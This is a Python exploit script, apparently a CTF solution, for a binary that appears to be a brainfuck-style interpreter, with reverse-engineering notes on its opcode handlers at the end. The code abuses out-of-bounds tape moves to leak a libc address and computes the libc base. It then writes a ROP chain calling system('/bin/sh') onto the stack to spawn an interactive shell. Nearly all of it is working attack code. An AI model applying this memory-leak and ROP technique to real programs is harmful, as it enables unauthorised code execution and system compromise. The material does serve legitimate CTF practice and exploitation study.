#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

context.log_level = "info"


def send_code(leng, data):
    ru(b"len> ")
    sl(i2b(leng))
    ru(b"code> ")
    s(data)


payload = b"a" * 0x10
send_code(0x18, payload)

payload = p8(62) * 0x58 + p8(46)
for i in range(7):
    payload += p8(62) + p8(46)
payload += p8(0)
send_code(len(payload), payload)

libc_base = u64_ex(rn(8)) - 0x21C87
lg("libc_base", libc_base)

pop_rdi_ret = libc_base + 0x000000000002164F

rop = flat(
    [
        pop_rdi_ret + 1,
        pop_rdi_ret,
        libc_base + next(libc.search(b"/bin/sh\x00")),
        libc_base + libc.sym.system,
    ]
)

payload = p8(62) * (0x38 - 1)
for i in range(len(rop)):
    payload += p8(62)
    payload += p8(44)
send_code(len(payload), payload)

debugB()
s(rop)

ia()

"""
var_B8          = dword ptr -0B8h i
code_len        = dword ptr -0B4h
var_B0          = qword ptr -0B0h buf + x (PC)
var_A8          = qword ptr -0A8h ptr_to_s
var_A0          = qword ptr -0A0h ano_s_buf
code_buf        = qword ptr -98h  code_buf
var_90          = qword ptr -90h  strange_chunk
var_88          = qword ptr -88h  code_buf
60  var_80          = qword ptr -80h  E85  // tmp--
62  var_78          = qword ptr -78h  EAF  // tmp++
43  var_70          = qword ptr -70h  ED8  // (*tmp)++
45  var_68          = qword ptr -68h  F11  // (*tmp)--
46  var_60          = qword ptr -60h  F4D  // putchar(*tmp)
44  var_58          = qword ptr -58h  F85  // getchar(*tmp)
91  var_50          = qword ptr -50h  FB9  // strange jmp
93  var_48          = qword ptr -48h  1089 // strange jmp bak
0   var_40          = qword ptr -40h  10FA // free strange_chunk and return
1   var_38          = qword ptr -38h  10D6 // nop
s               = byte ptr -30h
canary          = qword ptr -8
"""
